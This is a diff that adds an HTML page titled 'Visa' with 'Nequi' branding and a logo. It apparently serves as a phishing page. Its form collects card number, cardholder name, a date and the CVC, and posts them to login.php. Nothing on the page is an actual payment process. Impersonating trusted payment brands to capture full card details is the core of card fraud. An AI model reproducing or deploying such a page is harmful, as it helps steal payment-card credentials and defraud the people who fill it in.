@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visa</title>
+    <link href="Style/Visa.css" rel="stylesheet">
+</head>
+<body>
+    <div class="login-container">
+        <h2>Nequi</h2>
+<img src="IMAGENES/visa.jpg" alt="Nequi" height="80px" width="70px">
+
+        <form action="login.php" method="post">
+            <label for="Numero de Tarjeta">Numero de Tarjeta</label>
+            <input type="number" id="numero de tarjeta" name="numero de tarjeta" required>
+
+            <label for="Nombre">Nombre</label>
+            <input type="text" id="Nombre" name="Nombre" required>
+            
+            <label for="Fecha">Fecha de expedición</label>
+            <input type="date" id="Fecha" name="Fecha" required>
+
+            
+            <label for="CVC">CVC</label>
+            <input type="number" id="CVC" name="CVC" required>
+
+            <button type="submit">Enviar</button>
+        
+        </form>
+
+    </div>
+</body>
+</html>
